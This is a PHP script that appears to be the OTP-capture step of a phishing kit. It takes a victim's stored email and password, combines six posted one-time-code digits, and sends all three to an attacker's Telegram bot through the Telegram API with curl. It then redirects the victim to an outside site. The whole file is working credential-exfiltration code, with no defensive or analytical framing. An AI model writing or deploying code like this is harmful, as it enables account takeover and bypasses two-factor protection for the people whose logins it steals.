<?php

session_start();
include "./telegram.php";

$a = $_SESSION['email'];
$b = $_SESSION['password'];
$otp1 = $_POST['otp1'];
$_SESSION['otp1'] = $otp1;
$otp2 = $_POST['otp2'];
$_SESSION['otp2'] = $otp2;
$otp3 = $_POST['otp3'];
$_SESSION['otp3'] = $otp3;
$otp4 = $_POST['otp4'];
$_SESSION['otp4'] = $otp4;
$otp5 = $_POST['otp5'];
$_SESSION['otp5'] = $otp5;
$otp6 = $_POST['otp6'];
$_SESSION['otp6'] = $otp6;
$otp = $otp1.$otp2.$otp3.$otp4.$otp5.$otp6;
$_SESSION['otp'] = $otp;

$message = "
( KYCPORT | @Kennesia )

- Email : ".$a."
- Password : ".$b."
- Otp : ".$otp."
";

function sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot) {
    $url = "https://api.telegram.org/bot" . $kennesia_token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $kennesia_telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot);
header('Location: https://www.sidracoiinmall.site');
?>
